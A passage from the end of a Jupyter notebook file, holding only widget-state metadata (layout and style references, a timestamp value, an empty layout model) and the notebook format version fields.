       "layout": "IPY_MODEL_79a04d880a104b26b354b90b3fddd5af",
       "style": "IPY_MODEL_bc0b65dbca824d3b9d238c61541da94e",
       "value": "12:32:50.220000"
      }
     },
     "ffff872262834fcda1ed72ace0dd23d0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     }
    },
    "version_major": 2,
    "version_minor": 0
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
